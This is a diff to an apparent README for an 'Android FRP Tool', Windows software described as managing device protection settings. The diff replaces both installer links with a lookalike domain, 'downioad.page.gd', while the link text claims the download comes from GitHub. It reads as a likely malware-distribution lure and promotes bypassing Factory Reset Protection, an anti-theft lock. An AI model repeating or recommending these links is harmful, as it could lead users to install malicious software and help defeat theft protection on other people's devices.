@@ -2,7 +2,7 @@
 
 Android FRP Tool is an advanced software application developed for Windows desktops to assist users in managing and configuring device protection settings efficiently. Launched in 2026, it provides a robust set of tools with an intuitive interface, making it suitable for both beginners and professionals. Whether you need to adjust settings or troubleshoot issues, this software offers reliable solutions.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -55,4 +55,4 @@ For a visual demonstration of the installation process, refer to the GIF above.
 
 To get the latest version of Android FRP Tool, visit the download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
